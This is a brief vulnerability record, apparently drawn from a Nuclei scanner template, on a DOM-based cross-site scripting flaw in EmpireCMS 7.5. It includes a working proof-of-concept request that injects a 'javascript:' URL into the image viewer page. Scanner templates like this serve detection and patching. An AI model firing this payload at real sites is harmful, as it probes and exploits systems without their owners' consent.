# Vulnerability: EmpireCMS 7.5 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`CNVD-2021-15824.yaml`)

## Description
EmpireCMS is vulnerable to a DOM based cross-site scripting attack.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)
```
